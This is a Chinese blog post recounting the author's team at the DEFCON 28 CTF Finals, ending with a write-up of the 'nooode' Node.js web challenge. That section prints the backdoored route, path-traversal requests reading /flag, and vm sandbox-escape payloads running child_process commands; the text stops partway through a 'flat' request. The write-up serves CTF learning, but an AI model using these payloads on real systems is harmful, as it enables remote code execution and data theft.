<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="距离 DEFCON 28 Final 已经过去了两个多月了，本来结束就写写，但是因为一些后来事耽搁了，现在补一下这次参赛的一些经历。
"><title>DEFCON 28 Final 杂记</title>
<link rel=canonical href=https://blog.zeddyu.info/2020/10/15/Defcon28final/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="DEFCON 28 Final 杂记">
<meta property="og:description" content="距离 DEFCON 28 Final 已经过去了两个多月了，本来结束就写写，但是因为一些后来事耽搁了，现在补一下这次参赛的一些经历。
">
<meta property="og:url" content="https://blog.zeddyu.info/2020/10/15/Defcon28final/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2020-10-15T02:11:50+00:00"><meta property="article:modified_time" content="2020-10-15T02:11:50+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="DEFCON 28 Final 杂记">
<meta name=twitter:description content="距离 DEFCON 28 Final 已经过去了两个多月了，本来结束就写写，但是因为一些后来事耽搁了，现在补一下这次参赛的一些经历。
">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDESKL57LT',{anonymize_ip:!1})}</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2020/10/15/Defcon28final/>DEFCON 28 Final 杂记</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Oct 15, 2020</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
18 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>距离 DEFCON 28 Final 已经过去了两个多月了，本来结束就写写，但是因为一些后来事耽搁了，现在补一下这次参赛的一些经历。</p>
<p>[TOC]</p>
<h1 id=preface>Preface</h1>
<p><strong>前言：本篇文章不代表任何组织社团的观点，全文仅代表个人看法以及意见。如有冒犯请联系我进行必要的修改。</strong></p>
<p>由于今年疫情的原因，今年的 DEFCON Final 在线上举办，我有幸与 Tea Deliverers 一起参与了 DEFCON 28 CTF Final ，最终在比赛中取得了第四的成绩。本文我会主要从参赛经历见闻以及一些对于 Web 题的分析入手来写这篇文章，由于 Web 题过分简单，也没什么特别好分析的，所以没什么技术营养，可以权当小说看看，博君一笑。并且为了避免一些不必要的麻烦，全文涉及到姓名 ID 处我都尽量以某师傅进行称呼。</p>
<h1 id=the-first-defcon-final-in-my-life>The First DEFCON Final In My Life</h1>
<h2 id=simple-introduction>Simple Introduction</h2>
<p>今年的赛制我这里简单介绍一下，想详细了解的可以参考一下官网:https://oooverflow.io/dc-ctf-2020-finals/</p>
<p>题目主要分为两种类型，一种类型是 AWD ，另一种是 KOH ，AWD 就比较常见了，就是攻防题目，这次也是我第一次接触 KOH 这种题目类型，这种题目类型往往是题目中有自己的一个积分规则，然后让各个队伍在每个 ROUND 尽可能拿到更多的分数，每个 ROUND 取前 N 名，每个 ROUND 结束统计分数并给前 N 名的队伍在总榜的 KOH 列加分。在 KOH 中如何拿更多的分数就是这个题目的出题点了，这些出题点可以有一些设置的漏洞或者什么其他的方式让你可以在一个 ROUND 厘面得更多的分数，简单来说，你可以理解 KOH 给了你一个游戏，每个队伍每5分钟玩一把游戏，你可以通过对游戏分析来找到一些 bug 或者什么其他的点，通过这个点来帮助你像“开挂”一样得分。</p>
<h2 id=time>Time</h2>
<blockquote>
<p>​ We’ll start <a class=link href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=Start+of+DEF+CON+CTF+finals&iso=20200807T05&p1=127" target=_blank rel=noopener>5 AM Las Vegas time on Friday, August 7th</a> (4 AM for setup).</p>
<p>Here is the schedule (Nevada time == PDT):</p>
<ul>
<li>Shift 1: Friday 4am setup, 5am start, 1pm end</li>
<li><strong>First public recap: <a class=link href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&iso=20200807T14&p1=127" target=_blank rel=noopener>Friday 2 PM</a></strong></li>
<li>Shift 2: Friday 9pm setup, 10pm start, Saturday 6am end</li>
<li><strong>Second public recap: <a class=link href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&iso=20200808T13&p1=127" target=_blank rel=noopener>Saturday 1 PM</a></strong></li>
<li>Shift 3: Saturday 2pm setup, 3pm start, 11pm end</li>
<li>Shift 4: Sunday 7am setup, 8am start, 4pm end</li>
<li><strong>Third public recap: <a class=link href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&iso=20200809T12&p1=127" target=_blank rel=noopener>Sunday at noon</a> (during the game)</strong></li>
</ul>
</blockquote>
<p>这轮的时间可谓是相当的所谓的“健康”了，上述时间表翻译到北京时间过来就是：</p>
<blockquote>
<ul>
<li>Shift 1: Friday 7pm setup, 8pm start, Saturday 4am end</li>
<li>Shift 2: Saturday 12am setup, 1pm start, 9pm end</li>
<li>Shift 3: Sunday 5am setup, 6am start, 2pm end</li>
<li>Shift 4: Sunday 10pm setup, 11pm start, Monday 7am end</li>
</ul>
</blockquote>
<p>也就是说每个 Shift 比赛进行8小时，每个 Shift 中间间隔8小时，而且是正正好好的8小时 =.= 这就是所谓的“健康”赛制，但是我从比赛场地回家休息再搞会怎么都没剩多少时间了，我觉得还不如硬肝好了（反正我觉得没几个队像我这个混子一样8小时全睡），而且还分了4轮，这是真的肝，于是那几天我的世界就变成了一天16小时的世界，8小时看题当混子，8小时睡觉。（</p>
<h2 id=stealth-ports>Stealth Ports</h2>
<p>在 AWD 赛制中， OOO 加入了 Stealth Ports 这种机制：</p>
<blockquote>
<p>​ New this year, each service will have a STEALTH port alongside it’s normal port. The stealth port will be 10000+SERVICE_PORT, so If a challenge listens on port 1337, the stealth port will be 11337. The stealth port hits the same exact challenge endpoint as the normal port, but traffic through that port will not be released to the victim team. But beware: maintaining backdoor access to other teams ain’t cheap! If your team sends any traffic through a service’s stealth port to a given team, you will only receive half points for stealing that team’s flag that round.</p>
</blockquote>
<p>也就是说主办方给大家开放了一个不给流量的端口，如果有攻击方成功通过这个端口获取到防守方的 Flag ，则 Flag 分会减半。也就是说这相当于一个隐形的端口，对于一血的队伍比较有利，可以通过这个端口迅速打全场而不被捕获到流量，但是得分会减半，也算是一种双刃剑。</p>
<h2 id=before-shift-1>Before Shift 1</h2>
<p>开始之前我也并没有什么特别的准备，经过一番讨论决定我们还是在某师傅的公司里打比赛，这些讨论包括但不限于比赛场地要不要选一个别墅啥的，但是考虑到网络问题还是决定了在公司里，以及大家要不要一起先吃个饭做个赛前动员什么的。所以就在开赛前2小时多，也就是下午5点多，我随我 Mentor 就一起去跟队员们吃了个饭，也算是跟大家认识认识，然后就被排在了 Leader 旁边坐（紧张死了，有种领导夹菜我转桌的冲动），然后 Leader 旁边又是那个统治强网杯的“那个男人”（又紧张死了，第一次跟这种可怕的巨型大佬生物进行交流），整个会餐就这样在对于我来说在一种不可名状的氛围下结束了。XD（感觉其他人真的是又强又壮，<small>就我一个可怜弱小的小菜鸡</small></p>
<h2 id=shift-1>Shift 1</h2>
<p>由于之前接入等等准备工作师傅们都做完了，我便在 setup 就开混了，于是就尬等比赛开始。第一天放了貌似两个二进制的 AWD ，还有一个 KOH ，KOH 给的是一个 21 点的游戏，跟普通的 21 点游戏差不多，有一个庄家，所有队伍都进行下注，要牌超过 21 点的队伍就在当前 ROUND 直接出局，剩下的队伍继续进行游戏，通过这样的方式决出游戏积分前五名，在对应队伍的 KOH 分数上进行加分。</p>
<p>一开始没什么队伍得分，由于给出的是 Web 地址，于是我们一开始就当作 Web 题来做了，各种测了测，然后发现虽然这个 Web 平台是 Flask 并且开了 Debug ，一个上传错误直接跳到了 Debug 错误界面，但是由于没有找到其他地方有洞可以利用来获取 PIN 码，这条路就作废了。</p>
<p>然后十多分钟后，我们渐渐发现这个可以看到全局队伍所有人的上传文件，虽然文件有一定格式，并且类似一个指令类型的文件，虽然我们当时看不懂，但是发现 A0E 在得分之后，我们拿 A0E 的过来用就可以直接得分了（</p>
<p>后面才知道我上传的文件是修改了我们每次下注的积分，因为初始的时候每个队都一样，一次把自家身家200一次下完，而输的概率又很大，基本立马就出局了，然而通过一开始直接下注 1 个积分，这样就可以立马稳住战局，至少可以不会立马出局就可以排前五上分了。于是我们一开始就在 KOH 上分了，就这样通过 KOH 得分，我们稳住了前一天的排名，第一天的得分也就基本全都来自于 KOH 。</p>
<h2 id=shift-2--shift-3>Shift 2 & Shift 3</h2>
<p>由于时间也比较久远了，我记的不是特别清楚，这两个 Shift 就放一起了。由于之前貌似大家没怎么打 DEFCON QUALS 或者说打了的师傅这次 Final 没打？我们一开始并没有发现 KOH 那个题是改自 DEFCON QUALS Fountain OOO REliving ，是一个 Golly 相关的逆向题，当时看 QUALS 的 WriteUp 也是相当崩溃的，由于我这个小菜鸡没什么逆向基础，跟某师傅硬着头皮搞也没怎么搞出来，而这个还是升级版，当时看这个题目的附件图还是一脸懵逼的：</p>
<p><figure>
<a href="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true"><img src="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true" loading=lazy>
</a>
</figure></p>
<p>在 Golly 上瞎弄更是相当懵逼。虽然逆向帮不上啥，但是我还是每个 ROUND 都看一看各个队伍的表现以及策略，然后发现感觉也可能是一个数学期望题（？），我就尝试着算一下每次下注多少才能让我们每个 ROUND 大概率能在现有的队伍策略中胜出，然后通过不断的试不断的改，后面基本上靠运气能拿下不少分（</p>
<p>后面我们 AWD 分数也起来了，截止到 Shift 2 结束，我截了一张当时的图。（看着当时的 KOH 感觉当时运气真好</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png loading=lazy>
</a>
</figure></p>
<p>后面在 Shift 3 的时候，这个 21 点的题目一开始没多久就下了，于是我又开始混起来了，也就随便看看平台，然后看看队友们在干啥，中间貌似有一个 RPG 游戏的 AWD 题目，当时看他们玩起来感觉很有意思，就是大家通过操控自己的角色进行对应的操作拿 Flag ，而且还是具有一定实时操作性，总之看起来他们在打这个游戏非常有意思 XD</p>
<p>然后后面又放了两个 KOH ，一个是非常 Geek 的弹球游戏，还有一个是开飞船打飞船的游戏，两个都是逆向，也让我混的是理直气壮（大雾），虽然我想尽可能地帮忙，但是真是菜的真实，也就到处看看有什么可以帮忙的地方，比如，拿外卖（海盗虾饭外卖是真好吃，泡面真香，好久没吃泡面了，呜呜呜TAT）</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg loading=lazy>
</a>
</figure></p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg loading=lazy>
</a>
</figure></p>
<p>是我本人没错了（</p>
<p>后面主办方公布了 21 点的 WriteUp: <a class=link href=https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack target=_blank rel=noopener>https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack</a></p>
<p>虽然没怎么看懂逆向部分，但是看起来我们那个改下注分数的做法是解法之一，并且其他解法看起来也是挺有意思的。</p>
<h2 id=shift-4>Shift 4</h2>
<p>在最后一天开始几小时之后，主办方终于放出了一个本场唯一一个 Web ，题目地址在 <a class=link href=https://github.com/o-o-overflow/dc2020f-nooode-public target=_blank rel=noopener>dc2020f-nooode-public</a> ，整个题目我引用 PPP 对于这个题目的评价——“By the start of the final day, all of us were pretty much at our limits. Fortunately, the OOO maintained a tradition of releasing <strong>silly web</strong> problems near the end of the competition, and this year was no exception.”（此处采用了引用论证，引用了比较权威的人士对于题目的评价，增加了说服力）</p>
<p>基本上可以说是一句话在 Nodejs 上的完美体现，于是一开始就有人开始直接打了，我们也马上发现了这个 Backdooor ，于是我们也开始打，但是由于这个 Backdooor 真的是 silly ，很多队都迅速修了（除了 pasten 貌似没人参赛），后面也就没什么打法了。后面通过我们队里巨强的某师傅上了他写的巨强的 WAF ，我们拥有了巨强的防守能力。</p>
<p>于是就跟 A0E 某师傅尬聊了，</p>
<p>But 比赛过程中，有一轮突然我们又可以打很多队，突然发现主办方貌似又在没提前通知的情况下（也好像是通知了我没注意）重置了各队伍的环境，我们发现了又立马修了一波，然后发现是加强了 Check ，只能把超强师傅写的超强 WAF 瞎掉了，因此又掉了一些分（</p>
<p>But 比赛过程中，我们貌似有一个非 Web AWD 题目提交的 Patch 没通过而主办方没通知我们就立马断了我们跳板机网络，导致影响了我们大概两轮的操作。</p>
<p>Web 后面会单独做一些简单的分析，Web 题比较让我意外的是，A0E 他们使用的是黑名单过滤的机制，被我们的超级大师傅手动绕了，打了两回合就被修了，这也成了后面的一个伏笔。（某个渣男竟然跟我说要睡了却还在看流量</p>
<p>Stealth Port 的流量官方也公布了：https://oooverflow.io/dc-ctf-2020-finals/stealth.txt ，虽然看的有点迷惑，不过还是可以看到最后我们 Web 确实打了他们一波。</p>
<p>后面封榜然后到结束，基本就没有什么操作了，封榜前我看了一下分数差距，我觉得我们是应该跟 HITCON 争第三，PPP 跟 A0E 抢第一。</p>
<p>结束之后，虽然窗外的阳光格外的刺眼，北京早高峰伴随着汽车的鸣笛已经纷至沓来，但是室内我们比较平静，大家都收拾收拾东西，捡了捡垃圾方便阿姨打扫，随便聊了聊看了看其他队对于这次比赛的吐槽，然后就都各自回去休息了。我回去后开着 DEFCON 直播等了好一会，发现他们还挺磨蹭的，顺便洗了个澡，回来等待着揭晓最终结果。</p>
<p>后面公布榜单，得知我们是拿到了第四名，自己倒也没有什么特别的心情，知道之后也就整理整理这两天的题目，看了看大家对于这次比赛的评论，之后就睡了。</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg loading=lazy>
</a>
</figure></p>
<p>倒是在揭晓一二名的时候，主办方应该是特地做了一个分数动态图来显示最后比赛的激烈，烘托一下紧张的氛围，最后显示 A0E 以 2 分的优势险胜 PPP 拿到了冠军，也意味着刷新了中国大陆战队在 DEFCON CTF 上取得的最好的成绩，也算谁见证了一次历史吧 XD</p>
<h2 id=nooode>Nooode</h2>
<p>题目地址：https://github.com/o-o-overflow/dc2020f-nooode-public ，感兴趣的同学可以去分析复现一下。</p>
<p>Web 题问题主要是在 public-nooode/routes/config.js 文件中存在一处 BackDooor</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>router</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/validated/:lib?/:f?&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>config</span> <span class=o>=</span> <span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>config</span><span class=p>;</span>

  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>lib</span><span class=p>)</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>lib</span> <span class=o>=</span> <span class=s2>&#34;json-schema&#34;</span>
  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>f</span><span class=p>)</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>f</span> <span class=o>=</span> <span class=s2>&#34;validate&#34;</span>

  <span class=kd>let</span> <span class=nx>jsonlib</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>lib</span><span class=p>)</span>
  <span class=kd>let</span> <span class=nx>valid</span> <span class=o>=</span> <span class=nx>jsonlib</span><span class=p>[</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>f</span><span class=p>](</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>)</span>
  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>valid</span><span class=p>)</span> <span class=p>{</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;validator failed&#34;</span><span class=p>);</span>
    <span class=k>return</span>
  <span class=p>}</span>
  <span class=kd>let</span> <span class=nx>p</span><span class=p>;</span>
  <span class=k>if</span> <span class=p>(</span><span class=nx>config</span><span class=p>.</span><span class=nx>path</span><span class=p>)</span> <span class=p>{</span> 
    <span class=nx>p</span> <span class=o>=</span> <span class=nx>config</span><span class=p>.</span><span class=nx>path</span><span class=p>;</span>
  <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>config</span><span class=p>.</span><span class=nx>filepath</span><span class=p>)</span> <span class=p>{</span>
    <span class=nx>p</span> <span class=o>=</span> <span class=nx>config</span><span class=p>.</span><span class=nx>filepath</span><span class=p>;</span>
  <span class=p>}</span>

  <span class=kd>let</span> <span class=nx>data</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=nx>p</span><span class=p>).</span><span class=nx>toString</span><span class=p>()</span>
  <span class=k>try</span> <span class=p>{</span>
    <span class=nx>data</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>data</span><span class=p>)</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>_</span><span class=p>.</span><span class=nx>isEqual</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>,</span> <span class=nx>data</span><span class=p>))</span>
      <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span><span class=nx>data</span><span class=p>)</span>
    <span class=k>else</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span> <span class=s2>&#34;validator&#34;</span><span class=o>:</span> <span class=nx>valid</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=o>:</span><span class=nx>data</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=o>:</span> <span class=s2>&#34;data is corrupted&#34;</span><span class=p>})</span>
  <span class=p>}</span> <span class=k>catch</span> <span class=p>{</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span> <span class=s2>&#34;validator&#34;</span><span class=o>:</span> <span class=nx>valid</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=o>:</span><span class=nx>data</span><span class=p>})</span>
  <span class=p>}</span>
<span class=p>});</span>
</code></pre></div><p>比较熟悉的同学可以一眼就看看到问题所在了。</p>
<p>由于官方提供的是整场比赛所有的流量包过大，并没有具体分类，整个流量包多达 200 GB ，而且对于 Web 题目来说，基本几个流量包就能拿到大多数的 Payload 了，所以我拿了我手头上当时下载的基本分部了大多数时间段的流量包，提取了一下 HTTP 流量并进行了简单统计处理，并按照出现的次数进行了从高到低的排序，得到了以下的结果：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png loading=lazy>
</a>
</figure></p>
<p>奇怪，中间好像混入了什么奇怪的东西（</p>
<p>当然其他流量包或许还可能存在一些其他的 Payload ，但是基本该题所有的点都在这了。并且每个流量包都充斥着大量的垃圾流量，接下来就是垃圾流量大赏，原来你就是中国文化宣传大使？不用我多说就知道了吧，跟某个师傅打过 AWD 的都应该知道是谁发的这些垃圾流量。</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png loading=lazy>
</a>
</figure></p>
<h3 id=require>Require</h3>
<p>一开始大多队伍都打的是<code>require</code>直接包含的点，由于题目开了 debug 报错，在使用<code>require</code>包含 flag 的时候会直接报错回显 flag ，如下 000AAA 即为 flag</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Invalid or unexpected token<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>h2</span><span class=p>&gt;&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>pre</span><span class=p>&gt;</span>/flag:1
000AAAA
^^^

SyntaxError: Invalid or unexpected token
    at wrapSafe (internal/modules/cjs/loader.js:1070:16)
    at Module._compile (internal/modules/cjs/loader.js:1120:27)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1176:10)
    at Module.load (internal/modules/cjs/loader.js:1000:32)
    at Function.Module._load (internal/modules/cjs/loader.js:899:14)
    at Module.require (internal/modules/cjs/loader.js:1042:19)
    at Module.Hook._require.Module.require (/usr/local/lib/node_modules/pm2/node_modules/require-in-the-middle/index.js:80:39)
    at require (internal/modules/cjs/helpers.js:77:18)
    at /service/routes/config.js:21:17
    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)<span class=p>&lt;/</span><span class=nt>pre</span><span class=p>&gt;</span>
</code></pre></div><p>使用这个思路的 payload 就有很多变种了，例如：</p>
<ul>
<li><code>POST /config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1</code> 加上一些 body 内容、或者进行全 urlencode 、又或者再路径后面加一个路径<code>POST /config/validated/%2Fflag/a HTTP/1.1</code></li>
<li><code>POST /config/validated/%2ffl%61g HTTP/1.1</code></li>
<li><code>POST /config/validated/%2fproc%2fself%2froot%2ffl%61g HTTP/1.1</code></li>
</ul>
<h3 id=vm>vm</h3>
<p>还有就是可以通过内置的 vm lib ，由于 vm lib 逃逸已经被弄烂了，基本能找到可以直接利用的 exp 直接拿 flag</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/config/validated/vm/runInNewContext</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>zedd.vv:4017</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>160</span>

<span class=p>[</span><span class=s2>&#34;const process = this.constructor.constructor(&#39;return this.process&#39;)(); process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /f&#39;+&#39;l&#39;+&#39;a&#39;+&#39;g&#39;).toString()&#34;</span><span class=p>]</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json; charset=utf-8</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>85</span>
<span class=n>ETag</span><span class=o>:</span> <span class=l>W/&#34;55-/Dqsanp9FGAj8iXHTLNo/PbZBTc&#34;</span>
<span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 13 Oct 2020 10:52:05 GMT</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>

<span class=p>{</span><span class=nt>&#34;validator&#34;</span><span class=p>:</span><span class=s2>&#34;000AAAA\n&#34;</span><span class=p>,</span><span class=nt>&#34;data&#34;</span><span class=p>:{</span><span class=nt>&#34;treasure&#34;</span><span class=p>:</span><span class=s2>&#34;data-piece2&#34;</span><span class=p>},</span><span class=nt>&#34;msg&#34;</span><span class=p>:</span><span class=s2>&#34;data is corrupted&#34;</span><span class=p>}</span>
</code></pre></div><p>后面的就是基本是基于 post body 的变形了：</p>
<ul>
<li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li>
<li><code>["const p = this.constructor.constructor('return this.process')(); p.mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g').toString()"]</code></li>
<li><code>["p = this.constructor.constructor(\"return process\")(); r = p.mainModule.require; fs = r(\"fs\"); throw new Error(fs.readFileSync(\"/flag\").toString())"]</code></li>
<li><code>["var process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li>
<li><code>["p = this.constructor.constructor(\"return process\")(); r = p.mainModule.require; fs = r(\"fs\"); fs.readFileSync(\"/flag\").toString()"]</code></li>
<li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li>
<li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li>
<li><code>["var process = this.constructor.constructor(\"return process\")(); p.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li>
<li><code>["this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g')+[]"]</code></li>
<li><code>["this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /f*')+[]"]</code></li>
<li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /*g').toString()"]</code></li>
</ul>
<h3 id=flat>flat</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/config/validated/flat/unflatten</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>zedd.vv:4017</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>29</span>

